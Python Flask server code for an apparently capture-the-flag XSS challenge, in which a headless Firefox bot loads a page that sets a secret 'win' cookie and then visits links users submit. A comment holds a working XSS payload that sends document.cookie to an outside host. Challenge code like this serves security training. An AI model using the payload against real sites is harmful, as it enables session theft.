from flask import Flask, render_template, abort, session, request, redirect, make_response
from selenium import webdriver
from pyvirtualdisplay import Display
import re
import threading

# driver = webdriver.PhantomJS()

display = Display(visible=0, size=(800, 600))
display.start()

driver = webdriver.Firefox()

app = Flask(__name__)
app.config.from_object('config')

# http://localhost:7878/#<img src=x onerror="$(document.createElement('img')).attr('src', 'http://kchung.co/'+document.cookie).appendTo('body')">

def browserbot(link):
    global driver
    print link

    driver.set_page_load_timeout(5)
    driver.set_script_timeout(5)

    load = link[link.find('#'):]

    driver.get('http://localhost:7878/bbf4cf5c9c38f3b3c0ff13f0216cd275')
    try:
    	driver.get(link)
    except:
    	return

@app.route('/bbf4cf5c9c38f3b3c0ff13f0216cd275')
def upgrade():
	resp = make_response(render_template('chal.html'))
	resp.set_cookie('win', app.config['CHAL_KEY'])
	return resp


@app.route('/message', methods=['GET', 'POST'])
def message():
	msg = request.form['message']
	print msg
	threading.Thread(target = browserbot, args = (msg,)).start()
	return redirect('/')


@app.route("/", defaults={'template': 'index'})
@app.route("/<template>")
def static_html(template):
    try:
        return render_template('%s.html' % template)
    except:
        abort(404)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=7878, threaded=True)